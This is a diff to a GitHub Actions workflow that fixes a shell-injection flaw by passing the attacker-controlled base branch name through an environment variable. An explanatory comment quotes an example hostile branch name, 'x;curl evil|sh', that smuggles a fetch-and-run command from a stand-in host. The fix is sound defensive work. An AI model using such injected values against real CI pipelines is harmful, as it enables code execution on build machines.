@@ -59,10 +59,21 @@ jobs:
 
       - name: Check what this PR adds
         shell: bash
+        # `github.base_ref` is a BRANCH NAME, and a branch name is attacker-supplied.
+        # Interpolated with ${{ }} it is pasted into the shell before bash ever sees
+        # it, so a branch called `x;curl evil|sh` executes. Passed through `env:` it
+        # arrives as a plain variable and `"$BASE_REF"` is inert.
+        #
+        # Flagged by semgrep `run-shell-injection` (ERROR, baseline 0) on the first
+        # version of this file. Its sibling regex-assertion-ratchet.yml had already
+        # been fixed for exactly this — I wrote the same hole into a gate whose whole
+        # purpose is to make dangerous things justify themselves.
+        env:
+          BASE_REF: ${{ github.base_ref }}
         run: |
           set -euo pipefail
-          git fetch -q origin "${{ github.base_ref }}"
-          base=$(git merge-base HEAD "origin/${{ github.base_ref }}")
+          git fetch -q origin "$BASE_REF"
+          base=$(git merge-base HEAD "origin/$BASE_REF")
           echo "diffing $base..HEAD over *.sql"
           if git diff --unified=3 "$base"..HEAD -- '*.sql' | grep -q .; then
             git diff --unified=3 "$base"..HEAD -- '*.sql' \
